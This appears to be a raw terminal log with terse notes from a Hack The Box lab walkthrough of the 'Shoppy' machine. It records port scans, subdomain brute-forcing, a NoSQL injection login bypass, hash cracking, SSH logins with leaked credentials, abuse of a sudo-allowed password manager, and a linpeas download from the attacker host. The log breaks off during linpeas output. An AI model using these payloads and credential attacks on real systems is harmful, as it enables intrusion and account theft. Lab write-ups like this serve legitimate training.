```
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo openvpn lab_wittyAle.ovpn  

┌──(kali㉿kali)-[~/hackthebox]
└─$ ping 10.10.11.180
PING 10.10.11.180 (10.10.11.180) 56(84) bytes of data.
64 bytes from 10.10.11.180: icmp_seq=1 ttl=63 time=182 ms
64 bytes from 10.10.11.180: icmp_seq=2 ttl=63 time=185 ms
64 bytes from 10.10.11.180: icmp_seq=3 ttl=63 time=183 ms
^C
--- 10.10.11.180 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2005ms
rtt min/avg/max/mdev = 182.476/183.337/184.628/0.929 ms
                                                                                 
┌──(kali㉿kali)-[~/hackthebox]
└─$ rustscan -a 10.10.11.180 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.11.180:22
Open 10.10.11.180:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-08 12:21 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:21
Completed NSE at 12:21, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:21
Completed NSE at 12:21, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:21
Completed NSE at 12:21, 0.00s elapsed
Initiating Ping Scan at 12:21
Scanning 10.10.11.180 [2 ports]
Completed Ping Scan at 12:21, 0.18s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:21
Completed Parallel DNS resolution of 1 host. at 12:21, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:21
Scanning 10.10.11.180 [2 ports]
Discovered open port 80/tcp on 10.10.11.180
Discovered open port 22/tcp on 10.10.11.180
Completed Connect Scan at 12:21, 0.18s elapsed (2 total ports)
Initiating Service scan at 12:21
Scanning 2 services on 10.10.11.180
Completed Service scan at 12:21, 6.37s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.180.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:21
Completed NSE at 12:21, 5.39s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:21
Completed NSE at 12:21, 0.76s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:21
Completed NSE at 12:21, 0.00s elapsed
Nmap scan report for 10.10.11.180
Host is up, received syn-ack (0.18s latency).
Scanned at 2022-11-08 12:21:13 EST for 13s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e5e8351d99f89ea471a12eb81f922c0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDApZi3Kltv1yDHTatw6pKZfuIcoHfTnVe0W1yc9Uw7NMUinxjjQaQ731J+eCTwd8hBcZT6HQwcchDNR50Lwyp2a/KpXuH2my+2/tDvISTRTgwfMy1sDrG3+KPEzBag07m7ycshp8KhrRq0faHPrEgcagkb5T8mnT6zr3YonzoMyIpT+Q1O0JAre6GPgJc9im/tjaqhwUxCH5MxJCKQxaUf2SlGjRCH5/xEkNO20BEUYokjoAWwHUWjK2mlIrBQfd4/lcUzMnc5WT9pVBqQBw+/7LbFRyH4TLmGT9PPEr8D8iygWYpuG7WFOZlU8oOhO0+uBqZFgJFFOevq+42q42BvYYR/z+mFox+Q2lz7viSCV7nBMdcWto6USWLrx1AkVXNGeuRjr3l0r/698sQjDy5v0GnU9cMHeYkMc+TuiIaJJ5oRrSg/x53Xin1UogTnTaKLNdGkgynMqyVFklvdnUngRSLsXnwYNgcDrUhXxsfpDu8HVnzerT3q27679+n5ZFM=
|   256 5857eeeb0650037c8463d7a3415b1ad5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHiKrH/B/4murRCo5ju2KuPgkMjQN3Foh7EifMHEOwmoDNjLYBfoAFKgBnrMA9GzA+NGhHVa6L8CAxN3eaGXXMo=
|   256 3e9d0a4290443860b3b62ce9bd9a6754 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBRsWhJQCRHjDkHy3HkFLMZoGqCmM3/VfMHMm56u0Ivk
80/tcp open  http    syn-ack nginx 1.23.1
|_http-server-header: nginx/1.23.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://shoppy.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:21
Completed NSE at 12:21, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:21
Completed NSE at 12:21, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:21
Completed NSE at 12:21, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.56 seconds

┌──(kali㉿kali)-[~/hackthebox]
└─$ sudo nano /etc/hosts                                             
[sudo] password for kali: 
                                                                                 
┌──(kali㉿kali)-[~/hackthebox]
└─$ cat /etc/hosts                                           
127.0.0.1       localhost
127.0.1.1       kali
10.10.113.254   magician
10.10.121.237   git.git-and-crumpets.thm
10.10.149.10    hipflasks.thm hipper.hipflasks.thm
10.10.91.93     raz0rblack raz0rblack.thm
10.10.234.77    lab.enterprise.thm
10.10.96.58     source
10.10.59.104    CONTROLLER.local
10.10.54.75     acmeitsupport.thm
10.10.102.33    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm
10.10.179.221   development.smag.thm
10.10.87.241    mafialive.thm
10.10.97.105    internal.thm
10.10.106.113   retro.thm
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters


10.10.148.19 webenum.thm
10.10.148.19 mysubdomain.webenum.thm
10.10.148.19 learning.webenum.thm
10.10.148.19 products.webenum.thm
10.10.148.19 Products.webenum.thm
10.10.67.130 wpscan.thm
10.10.142.247 blog.thm
10.10.138.76 erit.thm
10.10.153.100 docker-rodeo.thm
10.129.132.154 unika.htb
10.129.105.231 thetoppers.htb
10.129.105.231 s3.thetoppers.htb
10.10.11.180 shoppy.htb

Vhost Discovery via gobuster

┌──(kali㉿kali)-[~/hackthebox]
└─$ gobuster vhost -u http://shoppy.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -t 64 
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://shoppy.htb
[+] Method:          GET
[+] Threads:         64
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.3
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2022/11/08 12:40:47 Starting gobuster in VHOST enumeration mode
===============================================================
Progress: 114411 / 114442 (99.97%)===============================================================
2022/11/08 12:46:28 Finished

┌──(kali㉿kali)-[~/hackthebox]
└─$ gobuster vhost -u http://shoppy.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --append-domain -t 64 
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://shoppy.htb
[+] Method:          GET
[+] Threads:         64
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:      gobuster/3.3
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2022/11/08 12:46:51 Starting gobuster in VHOST enumeration mode
===============================================================
Found: mattermost.shoppy.htb Status: 200 [Size: 3122]

┌──(kali㉿kali)-[~/hackthebox]
└─$ sudo nano /etc/hosts       
[sudo] password for kali: 
                                                                                 
┌──(kali㉿kali)-[~/hackthebox]
└─$ cat /etc/hosts                                           
127.0.0.1       localhost
127.0.1.1       kali
10.10.113.254   magician
10.10.121.237   git.git-and-crumpets.thm
10.10.149.10    hipflasks.thm hipper.hipflasks.thm
10.10.91.93     raz0rblack raz0rblack.thm
10.10.234.77    lab.enterprise.thm
10.10.96.58     source
10.10.59.104    CONTROLLER.local
10.10.54.75     acmeitsupport.thm
10.10.102.33    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm
10.10.179.221   development.smag.thm
10.10.87.241    mafialive.thm
10.10.97.105    internal.thm
10.10.106.113   retro.thm
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters


10.10.148.19 webenum.thm
10.10.148.19 mysubdomain.webenum.thm
10.10.148.19 learning.webenum.thm
10.10.148.19 products.webenum.thm
10.10.148.19 Products.webenum.thm
10.10.67.130 wpscan.thm
10.10.142.247 blog.thm
10.10.138.76 erit.thm
10.10.153.100 docker-rodeo.thm
10.129.132.154 unika.htb
10.129.105.231 thetoppers.htb
10.129.105.231 s3.thetoppers.htb
10.10.11.180 shoppy.htb
10.10.11.180 mattermost.shoppy.htb

source code just countdown timer

Enumerate directories and files 

┌──(kali㉿kali)-[~/hackthebox]
└─$ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "http://shoppy.htb/FUZZ/"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://shoppy.htb/FUZZ/
Total requests: 62284

=====================================================================
ID           Response   Lines    Word       Chars       Payload         
=====================================================================

000000003:   302        0 L      4 W        28 Ch       "admin"         
000000039:   200        25 L     62 W       1074 Ch     "login"         
000000109:   302        0 L      4 W        28 Ch       "Admin"         
000000160:   200        25 L     62 W       1074 Ch     "Login"         
000000681:   302        0 L      4 W        28 Ch       "ADMIN"         
 /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 2977
Filtered Requests: 2972
Requests/sec.: 0

-c: flag is used to show the output in colors

    · -z: to specify the payload list.

┌──(kali㉿kali)-[~/hackthebox]
└─$ feroxbuster --url http://shoppy.htb/ -w /usr/share/wordlists/dirb/common.txt -t 60 -C 404,403

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://shoppy.htb/
 🚀  Threads               │ 60
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 💢  Status Code Filters   │ [404, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
[>-------------------] - 0s         1/4614    14m     found:0       errors:0     [>-------------------] - 0s         2/4614    14m     found:0       errors:0     [>-------------------] - 0s         2/4614    14m     found:0       errors:0     [>-------------------] - 0s         4/4614    14m     found:0       errors:0     200      GET       57l      129w     2178c http://shoppy.htb/
[>-------------------] - 0s        11/4614    9m      found:0       errors:0     [>-------------------] - 0s        64/4614    1m      found:1       errors:0     [>-------------------] - 1s       124/4614    39s     found:1       errors:0     [>-------------------] - 1s       162/4614    34s     found:1       errors:0     [>-------------------] - 1s       184/4614    31s     found:1       errors:0     [>-------------------] - 1s       216/4614    28s     found:1       errors:0     [#>------------------] - 1s       238/4614    27s     found:1       errors:0     [#>------------------] - 1s       253/4614    27s     found:1       errors:0     [#>------------------] - 1s       283/4614    25s     found:1       errors:0     302      GET        1l        4w       28c http://shoppy.htb/admin => /login
[#>------------------] - 1s       288/4614    25s     found:1       errors:0     302      GET        1l        4w       28c http://shoppy.htb/Admin => /login
[#>------------------] - 1s       289/4614    25s     found:2       errors:0     302      GET        1l        4w       28c http://shoppy.htb/ADMIN => /login

https://book.hacktricks.xyz/pentesting-web/nosql-injection

sqli

Normal sql: ' or 1=1-- -
Mongo sql: ' || 1==1//    or    ' || 1==1%00

login with username and any pass

admin'||''==='
admin'||'1==1

then search for with the same payload like before and download export

[{"_id":"62db0e93d6d6a999a66ee67a","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"},{"_id":"62db0e93d6d6a999a66ee67b","username":"josh","password":"6ebcea65320589ca4f2f1ce039975995"}]

found some hashes

┌──(kali㉿kali)-[~/hackthebox]
└─$ echo "6ebcea65320589ca4f2f1ce039975995" > josh.hash              
                                                                                 
┌──(kali㉿kali)-[~/hackthebox]
└─$ hashcat -a 0 -m 0 josh.hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 1243/2550 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

6ebcea65320589ca4f2f1ce039975995:remembermethisway        
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 6ebcea65320589ca4f2f1ce039975995
Time.Started.....: Tue Nov  8 13:39:51 2022 (3 secs)
Time.Estimated...: Tue Nov  8 13:39:54 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   861.6 kH/s (0.27ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 812032/14344385 (5.66%)
Rejected.........: 0/812032 (0.00%)
Restore.Point....: 811008/14344385 (5.65%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: reynaline -> releve
Hardware.Mon.#1..: Util: 45%

Started: Tue Nov  8 13:39:47 2022
Stopped: Tue Nov  8 13:39:55 2022

login in the subdomain found http://mattermost.shoppy.htb/login
josh:remembermethisway 

I found a cute white cat 🙀 in channels chat and in deploy machine ssh jaeger:Sh0ppyBest@pp!

┌──(kali㉿kali)-[~/hackthebox]
└─$ ssh jaeger@10.10.11.180       
The authenticity of host '10.10.11.180 (10.10.11.180)' can't be established.
ED25519 key fingerprint is SHA256:RISsnnLs1eloK7XlOTr2TwStHh2R8hui07wd1iFyB+8.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.180' (ED25519) to the list of known hosts.
jaeger@10.10.11.180's password: Sh0ppyBest@pp!
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Nov  8 12:31:26 2022 from 10.10.16.40
jaeger@shoppy:~$ ls
Desktop    Downloads  output.txt  Public     shoppy_start.sh  user.txt
Documents  Music      Pictures    ShoppyApp  Templates        Videos
jaeger@shoppy:~$ cat user.txt
d6d5119639db208d9b5d2e686637f0c3

submit flag 

priv esc

jaeger@shoppy:~$ sudo -l
[sudo] password for jaeger: Sh0ppyBest@pp!
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager

jaeger@shoppy:~$ cat /home/deploy/password-manager
ELF> @H@@8
....
Welcome to Josh password manager!Please enter your master password: SampleAccess granted! Here is creds !cat /home/deploy/creds.txtAccess denied! This incident will be reported !
...

jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: SampleAccess
Access denied! This incident will be reported !
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!

jaeger@shoppy:~$ su deploy
Password: 
$ bash
deploy@shoppy:/home/jaeger$ 

deploy@shoppy:~$ ls
creds.txt  password-manager  password-manager.cpp
deploy@shoppy:~$ cat creds.txt 
Deploy Creds :
username: deploy
password: Deploying@pp!

┌──(kali㉿kali)-[~/hackthebox]
└─$ locate linpeas 
/home/kali/Downloads/linpeas.sh
                                                                                 
┌──(kali㉿kali)-[~/hackthebox]
└─$ cd /home/kali/Downloads 
                                                                                 
┌──(kali㉿kali)-[~/Downloads]
└─$ cp linpeas.sh ../hackthebox 
                                                                                 
┌──(kali㉿kali)-[~/Downloads]
└─$ cd ../hackthebox           
                                                                                 
┌──(kali㉿kali)-[~/hackthebox]
└─$ ls            
allowed.userlist                        index.php       revshell.php
allowed.userlist.passwd                 josh.hash       rogue-jndi
backup.zip                              linpeas.sh      share
ferox-http_shoppy_htb-1667929122.state  nc64.exe        style.css
hash_vaccine                            prod.dtsConfig  winPEASx64.exe
hash_zip                                Responder

upload linpeas.sh 

deploy@shoppy:/tmp$ wget http://10.10.14.133:8000/linpeas.sh -o linpeas.sh
deploy@shoppy:/tmp$ ls
10.10.14.133:8000
linpeas.sh
linpeas.sh.1
mongodb-27017.sock
plugin123630812
plugin227633031
plugin249747073
plugin2623760581
plugin3438945239
systemd-private-32fa3017c8fa4d8ab11821b742273dca-colord.service-nWyXeh
systemd-private-32fa3017c8fa4d8ab11821b742273dca-ModemManager.service-5NAzPi
systemd-private-32fa3017c8fa4d8ab11821b742273dca-switcheroo-control.service-oNd3of
systemd-private-32fa3017c8fa4d8ab11821b742273dca-systemd-logind.service-WAkrAh
systemd-private-32fa3017c8fa4d8ab11821b742273dca-systemd-timesyncd.service-ewdfJg
systemd-private-32fa3017c8fa4d8ab11821b742273dca-upower.service-NpW2gh
VMwareDnD
vmware-root_481-2092775992
deploy@shoppy:/tmp$ chmod +x linpeas.sh
deploy@shoppy:/tmp$ ./linpeas.sh
./linpeas.sh: line 1: --2022-11-08: command not found
./linpeas.sh: line 2: Connecting: command not found
./linpeas.sh: line 3: HTTP: command not found
./linpeas.sh: line 4: syntax error near unexpected token `('
./linpeas.sh: line 4: `Length: 777018 (759K) [text/x-sh]'
deploy@shoppy:/tmp$ ./linpeas.sh.1
bash: ./linpeas.sh.1: Permission denied
deploy@shoppy:/tmp$ chmod +x linpeas.sh.1
deploy@shoppy:/tmp$ ./linpeas.sh.1


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------\
    |                             Do you like PEASS?                            |
    |---------------------------------------------------------------------------|                                                                                 
    |         Get latest LinPEAS  :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter   :     @carlospolopm                           |
    |         Respect on HTB      :     SirBroccoli                             |
    |---------------------------------------------------------------------------|
    |                                 Thank you!                                |
    \---------------------------------------------------------------------------/
          linpeas-ng by carlospolop                                              
                                                                                 
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                          
                                                                                 
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist                                                         
 LEGEND:                                                                         
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Basic information ╠═════════════════════════════════════════                                                           
                                         ╚═══════════════════╝                   
OS: Linux version 5.10.0-18-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils for Debian) 2.35.2) #1 SMP Debian 5.10.140-1 (2022-09-02)
User & Groups: uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
Hostname: shoppy
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)                                                             
[+] /usr/bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                 
                                                                                 

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE                                                            
                                                                                 
                                        ╔════════════════════╗
════════════════════════════════════════╣ System Information ╠════════════════════════════════════════                                                            
                                        ╚════════════════════╝                   
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                                
Linux version 5.10.0-18-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils for Debian) 2.35.2) #1 SMP Debian 5.10.140-1 (2022-09-02)
Distributor ID: Debian
Description:    Debian GNU/Linux 11 (bullseye)
Release:        11
Codename:       bullseye

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version  
Sudo version 1.9.5p2                                                             

╔══════════╣ CVEs Check
./linpeas.sh.1: 1197: [[: not found                                              
./linpeas.sh.1: 1197: rpm: not found
./linpeas.sh.1: 1197: 0: not found
./linpeas.sh.1: 1207: [[: not found


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                                                           
/home/jaeger/.nvm/versions/node/v18.6.0/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
New path exported: /home/jaeger/.nvm/versions/node/v18.6.0/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/sbin:/usr/sbin:/sbin

╔══════════╣ Date & uptime
Tue 08 Nov 2022 01:02:48 PM CST                                                  
 13:02:48 up  8:49,  3 users,  load average: 26.28, 12.74, 5.77

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                             
sda
sda1
sda2
sda5

╔══════════╣ Unmounted file-system?
╚ Check if you can mount unmounted devices                                       
UUID=f9e8ad11-5997-4162-b5af-462c4a6e474e /               ext4    errors=remount-ro 0       1
UUID=93744b43-6413-496c-a6b4-0d7383deafca none            swap    sw              0       0
/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0
proc    /proc   proc    defaults,nosuid,nodev,noexec,relatime,hidepid=2 0       0

╔══════════╣ Environment
╚ Any private information inside environment variables?                          
HISTFILESIZE=0                                                                   
MAIL=/var/mail/deploy
USER=deploy
SSH_CLIENT=10.10.14.133 34210 22
XDG_SESSION_TYPE=tty
SHLVL=2
MOTD_SHOWN=pam
HOME=/home/deploy
OLDPWD=/
NVM_BIN=/home/jaeger/.nvm/versions/node/v18.6.0/bin
SSH_TTY=/dev/pts/1
NVM_INC=/home/jaeger/.nvm/versions/node/v18.6.0/include/node
NVM_DIR=/home/jaeger/.nvm
LOGNAME=deploy
_=./linpeas.sh.1
XDG_SESSION_CLASS=user
TERM=xterm-256color
XDG_SESSION_ID=194
PATH=/home/jaeger/.nvm/versions/node/v18.6.0/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/sbin:/usr/sbin:/sbin
XDG_RUNTIME_DIR=/run/user/1000
LANG=en_US.UTF-8
HISTSIZE=0
